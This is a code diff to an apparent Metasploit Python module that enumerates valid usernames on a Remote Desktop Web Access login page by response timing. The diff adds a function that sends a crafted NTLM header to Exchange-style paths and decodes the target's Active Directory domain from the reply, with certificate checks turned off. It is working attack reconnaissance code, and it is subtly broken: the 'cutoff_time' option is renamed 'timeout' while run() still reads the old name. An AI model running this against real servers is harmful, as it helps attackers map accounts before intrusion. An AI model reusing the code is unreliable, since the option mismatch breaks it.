@@ -8,6 +8,7 @@ from metasploit import module
 dependencies_missing = False
 try:
     import requests
+    import base64
 except ImportError:
     dependencies_missing = True
 
@@ -32,13 +33,36 @@ metadata = {
                       'required': True, 'default': '/RDWeb/Pages/en-US/login.aspx'},
         'rhost': {'type': 'address', 'description': 'Host to target', 'required': True, 'default': None},
         'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
-        'domain': {'type': 'string', 'description': 'The target AD domain', 'required': True, 'default': None},
+        'domain': {'type': 'string', 'description': 'The target AD domain', 'required': False, 'default': None},
         'username': {'type': 'string', 'description': 'The username to verify', 'required': True, 'default': None},
-        'cutoff_time': {'type': 'int',
-                        'description': 'Minimum milliseconds for response to consider username invalid',
-                        'required': True, 'default': 500}
+        'timeout': {'type': 'int',
+                    'description': 'Timeout in milliseconds for response to consider username invalid',
+                    'required': True, 'default': 1250},
+        'enum_domain': {'type': 'bool',
+                        'description': 'Automatically enumerate AD domain using NTLM',
+                        'required': False, 'default': True}
     }
 }
+
+
+def get_ad_domain(rhost, rport):
+    """Retrieve the NTLM domain out of a specific challenge/response"""
+    domain_urls = ['aspnet_client', 'Autodiscover', 'ecp', 'EWS', 'OAB',
+                   'Microsoft-Server-ActiveSync', 'PowerShell', 'rpc']
+    headers = {'Authorization': 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==',
+               'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
+               'Host': rhost}
+    session = requests.Session()
+    for url in domain_urls:
+        target_url = f"https://{rhost}:{rport}/{url}"
+        request = session.get(target_url, headers=headers, verify=False)
+        # Decode the provided NTLM Response to strip out the domain name
+        if request.status_code == 401 and 'WWW-Authenticate' in request.headers and 'NTLM' in request.headers['WWW-Authenticate']:
+            domain_hash = request.headers['WWW-Authenticate'].split('NTLM ')[1].split(',')[0]
+            domain = base64.b64decode(bytes(domain_hash, 'utf-8')).replace(b'\x00',b'').split(b'\n')[1]
+            domain = domain[domain.index(b'\x0f') + 1:domain.index(b'\x02')].decode('utf-8')
+            module.log(f'Found Domain: {domain}', level='good')
+            return domain
 
 
 def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
@@ -70,11 +94,23 @@ def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
 def run(args):
     module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
     if dependencies_missing:
-        logging.error('Module dependency (requests) is missing, cannot continue')
+        module.log('Module dependency (requests) is missing, cannot continue', level='error')
         return
 
+    # Gather AD Domain either from args or enumeration
+    domain = args['domain'] if 'domain' in args else None
+    if not domain and args['enum_domain']:
+        domain = get_ad_domain(args['rhost'], args['rport'])
+
+    # Verify we have a proper domain
+    if not domain:
+        module.log('Either domain or enum_domain must be set to continue, aborting...',
+                   level='error')
+        return
+
+    # Check the provided username
     check_username(args['rhost'], args['rport'], args['targeturi'],
-                   args['domain'], args['username'], int(args['cutoff_time']))
+                   domain, args['username'], int(args['cutoff_time']))
 
 
 if __name__ == '__main__':
